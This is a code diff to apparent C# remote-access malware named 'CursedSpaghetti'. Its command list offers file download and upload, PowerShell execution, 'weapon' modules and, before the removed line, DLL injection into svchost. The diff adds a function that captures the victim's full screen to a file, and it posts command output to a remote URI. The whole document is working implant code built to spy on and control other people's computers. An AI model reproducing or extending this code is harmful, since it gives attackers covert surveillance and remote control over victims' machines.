@@ -5,6 +5,8 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Runtime.InteropServices;
 using System.Management;
+using System.Drawing;
+using System.Windows.Forms;
 
 namespace CursedSpaghetti
 {
@@ -19,8 +21,8 @@ namespace CursedSpaghetti
                 "   download <file>         Download file\n" +
                 "   exit                    Close the client connection\n" +
                 "   help                    Print this message\n" +
-                "   inject <dll_file>       Inject a dll into clipboard svchost" +
                 "   powershell <command>    Run powershell command\n" +
+                "   screnshot               Take a screenshot\n" +
                 "   session                 Get session ID\n" +
                 "   upload                  Upload file" +
                 "   weapon                  Use a weapon module\n";
@@ -34,7 +36,7 @@ namespace CursedSpaghetti
         static extern public bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
         // File to byte[]
-        private static byte[] FileToByte(string location, string filename)
+        public static byte[] FileToByte(string location, string filename)
         {
             string initial = Directory.GetCurrentDirectory();
             Directory.SetCurrentDirectory(location);
@@ -253,6 +255,23 @@ namespace CursedSpaghetti
 
             Post(uri, output);
         }
+
+        // Take Screeshot
+        public static void takeScreenShot(string location, string filename)
+        {
+            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            using (Graphics g = Graphics.FromImage(bmp))
+            {
+                g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
+                bmp.Save(String.Format("{0}/{1}", location, filename));  // saves the image
+
+            }
+        }
+
+        // Get Timestamp
+        public static string GetTimestamp(DateTime value)
+        {
+            return value.ToString("yyyyMMddHHmmssfff");
+        }
     }
 }
-    
